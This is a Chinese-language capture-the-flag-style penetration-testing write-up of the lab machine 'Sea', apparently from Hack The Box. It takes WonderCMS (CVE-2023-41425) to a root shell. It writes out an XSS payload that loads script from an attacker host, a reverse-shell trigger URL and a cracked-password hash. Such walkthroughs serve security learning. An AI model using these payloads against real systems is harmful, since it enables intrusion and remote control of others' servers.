# 记一次渗透测试实战之Sea-先知社区

> **来源**: https://xz.aliyun.com/news/16409  
> **文章ID**: 16409

---

# Web渗透

## 端口扫描

使用nmap进行端口探测

![](images/20241231143442-51ae45de-c741-1.png)

发现存在22和80端口开放。

![](images/20241231143507-6088789a-c741-1.png)

访问80端口，然后使用F12查看源代码。

![](images/20241231143518-66e81574-c741-1.png)

## 目录爆破

接着使用工具爆破目录  
发现存在一些 目录。  
访问README.MD，发现是WonderCMS

![](images/20241231143536-71768cbe-c741-1.png)

## CVE搜索

使用浏览器搜索，发现存在CVE漏洞。

![](images/20241231143618-8ad13a38-c741-1.png)

访问contact.PHP.

![](images/20241231143851-e5cbb562-c741-1.png)

## SSRF漏洞

测试功能点。

![](images/20241231143908-eff8174c-c741-1.png)

发现存在SSRF漏洞。

![](images/20241231143916-f4fd0644-c741-1.png)

## CVE-2023-41425

接着访问index.php?目录

![](images/20241231143938-020f63b8-c742-1.png)

# 漏洞尝试

```
http://sea.htb/index.php?page=loginURL"></form><script src="http://10.10.16.3:8000/xss.js"></script><form action="
```

使用exp.py脚本尝试，发现未能攻击成功。

![](images/20241231144146-4df28238-c742-1.png)

访问发现不能成功利用。  
<http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.3&lport=4444>

![](images/20241231144156-540af970-c742-1.png)

查看JS文件。

![](images/20241231144225-653af830-c742-1.png)

## 获取Webshell

修改之后，重新尝试，成功获取shell。

![](images/20241231144234-6aa98b6a-c742-1.png)

![](images/20241231144244-70782dee-c742-1.png)

## 获取交互式SHELL。

![](images/20241231144254-76964418-c742-1.png)

# 横向移动

## 内网信息收集

然后进行内网信息收集。

![](images/20241231144319-85ad3560-c742-1.png)

查看/etc/passwd

![](images/20241231144326-89937874-c742-1.png)

查看数据库文件。

![](images/20241231144334-8e948106-c742-1.png)

查看目录。

![](images/20241231144336-8f9e4488-c742-1.png)

## 获取数据库文件

![](images/20241231144353-99c1518a-c742-1.png)

测试localhost

![](images/20241231144405-a0bcef08-c742-1.png)

查看数据库文件，获取password。

![](images/20241231144417-a8458bf4-c742-1.png)

## hash解密

"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",  
使用hashcat解密，获取密码。

![](images/20241231144439-b52ec650-c742-1.png)

![](images/20241231144449-baf3f98e-c742-1.png)

接着使用netexec验证ssh吗密码。

![](images/20241231144502-c2d32e04-c742-1.png)

## ssh登录

![](images/20241231144512-c8ff7742-c742-1.png)

使用SU进行切换。

![](images/20241231144524-d019b86c-c742-1.png)

## 代理搭建

接着搭建代理。

![](images/20241231144532-d4bcc9fe-c742-1.png)

搭建客户端。

![](images/20241231144541-da84b400-c742-1.png)

访问web站点。

![](images/20241231144550-df77379e-c742-1.png)

## 漏洞尝试

发现可以进行文件读取。

![](images/20241231144602-e6776fa0-c742-1.png)

## 文件读取

然后读/etc/password

![](images/20241231144611-ebd98f6e-c742-1.png)

测试发现存在SQL注入

![](images/20241231144618-f08575c8-c742-1.png)

![](images/20241231144627-f55f934e-c742-1.png)

确定分组权限。

![](images/20241231144636-faecfdba-c742-1.png)

## 获取root权限

然后添加用户到管理员组，获取root权限。

![](images/20241231144646-010144fe-c743-1.png)
